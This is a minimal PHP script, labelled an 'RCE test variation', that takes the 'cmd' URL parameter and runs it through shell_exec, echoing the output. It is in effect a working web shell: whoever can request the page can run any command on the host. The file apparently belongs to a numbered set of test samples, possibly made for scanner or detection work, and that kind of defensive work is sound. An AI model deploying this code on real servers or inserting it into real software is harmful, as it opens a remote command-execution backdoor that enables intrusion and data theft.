<?php
// RCE test variation #1057
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>